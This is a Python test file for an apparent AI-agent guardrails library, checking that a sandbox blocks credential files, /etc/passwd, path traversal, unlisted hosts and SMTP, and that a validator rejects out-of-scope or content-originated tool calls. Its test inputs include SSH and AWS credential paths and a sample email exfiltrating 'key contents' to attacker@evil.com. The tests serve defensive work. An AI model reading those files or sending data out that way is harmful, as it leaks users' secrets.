"""Tests for filesystem sandbox and tool call validator."""

from __future__ import annotations

import pytest

from guardrails.sandbox.filesystem import validate_path, validate_network
from guardrails.sandbox.tool_validator import validate_tool_call
from guardrails.models import ToolCallRequest, Severity


def test_allowed_path_passes():
    ok, reason = validate_path("/home/user/project/src/main.py")
    assert ok, reason


def test_blocked_ssh_path():
    ok, reason = validate_path("~/.ssh/id_rsa")
    assert not ok
    assert "ssh" in reason.lower() or "blocked" in reason.lower()


def test_blocked_aws_path():
    ok, reason = validate_path("~/.aws/credentials")
    assert not ok


def test_blocked_env_file():
    ok, reason = validate_path("~/.env")
    assert not ok


def test_blocked_etc_passwd():
    ok, reason = validate_path("/etc/passwd")
    assert not ok


def test_path_traversal_blocked():
    ok, reason = validate_path("/home/user/project/../../etc/passwd")
    assert not ok


def test_allowed_domain():
    ok, reason = validate_network("api.github.com")
    assert ok, reason


def test_blocked_arbitrary_domain():
    ok, reason = validate_network("attacker.evil.com")
    assert not ok


def test_smtp_blocked():
    ok, reason = validate_network("smtp.gmail.com:587")
    assert not ok
    assert "smtp" in reason.lower() or "email" in reason.lower()


def test_tool_in_scope_passes():
    req = ToolCallRequest(
        tool_name="read_file",
        args={"path": "/home/user/project/main.py"},
        origin="user",
        user_request="Fix the bug in main.py",
    )
    result = validate_tool_call(req)
    assert result.allowed


def test_out_of_scope_tool_blocked():
    req = ToolCallRequest(
        tool_name="send_email",
        args={"to": "attacker@evil.com", "body": "key contents"},
        origin="user",
        user_request="Fix the bug in main.py",
    )
    result = validate_tool_call(req)
    assert not result.allowed
    assert result.violated_rule == "tool_scope"
    assert result.severity == Severity.HIGH


def test_content_origin_tool_blocked():
    req = ToolCallRequest(
        tool_name="read_file",
        args={"path": "/home/user/project/data.txt"},
        origin="content",
        user_request="Summarize the report",
    )
    result = validate_tool_call(req)
    assert not result.allowed
    assert result.violated_rule == "provenance_check"
    assert result.severity == Severity.CRITICAL


def test_sandbox_path_violation_blocked():
    req = ToolCallRequest(
        tool_name="read_file",
        args={"path": "~/.ssh/id_rsa"},
        origin="user",
        user_request="Show me my SSH key",
    )
    result = validate_tool_call(req)
    assert not result.allowed
    assert result.violated_rule == "sandbox_filesystem"
